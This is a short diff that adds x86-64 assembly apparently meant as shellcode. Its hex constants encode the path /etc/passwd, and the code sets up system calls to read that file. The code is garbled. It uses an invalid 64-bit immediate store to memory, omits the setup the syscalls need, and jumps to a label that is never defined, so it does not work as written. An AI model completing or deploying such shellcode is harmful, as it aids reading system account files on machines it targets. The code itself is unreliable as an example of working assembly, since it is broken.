@@ -1,0 +1,15 @@
+.global _start
+.text
+_start:
+mov [123], 0x6477737361702FFF
+push [123]
+push 12
+pop r12
+push r12
+mov r13, 13
+mov r12, 0xFFFFFFFF6374652F
+xor rax, rax
+syscall
+jne loop_read
+close_file:
+syscall
